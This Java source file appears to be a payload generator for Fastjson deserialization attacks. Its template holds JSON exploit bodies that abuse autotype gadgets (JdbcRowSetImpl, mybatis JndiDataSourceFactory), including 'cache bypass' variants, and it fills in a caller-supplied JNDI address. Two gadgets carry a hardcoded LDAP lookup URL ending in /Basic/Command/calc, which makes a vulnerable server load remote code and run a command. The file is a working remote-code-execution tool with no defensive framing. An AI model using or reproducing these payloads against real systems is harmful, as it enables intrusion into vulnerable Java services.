package com.ding0x0.fastjson;

public class JNDIPayload {

    String jndi;
    String template = "[+] JdbcRowSetImpl\n"+
            "   {\n" +
            "       \"fw\":{\n" +
            "           \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +
            "           \"dataSourceName\":\"%s\",\n" +
            "           \"autoCommit\":true\n" +
            "       }\n" +
            "   }\n" +
            "[+] JdbcRowSetImpl 缓存绕过 \n" +
            "   {\n" +
            "       \"fw1\":{\n" +
            "           \"@type\":\"java.lang.Class\",\n" +
            "           \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n" +
            "       },\n" +
            "       \"fw2\":{\n" +
            "           \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +
            "           \"dataSourceName\":\"%s\",\"autoCommit\":true\n" +
            "       }\n" +
            "   }\n" +
            "[+] mybatis JndiDataSourceFactory\n"+
            "   {\n" +
            "       \"fw\":{\n" +
            "           \"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\n" +
            "           \"properties\":{\n" +
            "               \"data_source\":\"ldap://127.0.0.1:1389/Basic/Command/calc\"\n" +
            "           }\n" +
            "       }\n" +
            "   }\n"+
            "[+] mybatis JndiDataSourceFactory 缓存绕过\n" +
            "   {\n" +
            "       \"fw1\":{\n" +
            "           \"@type\":\"java.lang.Class\",\n" +
            "           \"val\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\"\n" +
            "       },\n" +
            "       \"fw2\":{\n" +
            "           \"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\n" +
            "           \"properties\":{\n" +
            "               \"data_source\":\"ldap://127.0.0.1:1389/Basic/Command/calc\"\n" +
            "           }\n" +
            "       }\n" +
            "   }";

    public JNDIPayload(String jndi){
        this.jndi = jndi;
    }

    public String format(){
        return this.template.replaceAll("%s",this.jndi);
//        return String.format(this.template, this.jndi, this.jndi);
    }

    public static void main(String[] args) {
        JNDIPayload jndiPayload = new JNDIPayload("123");
        System.out.println(jndiPayload.format());
    }
}
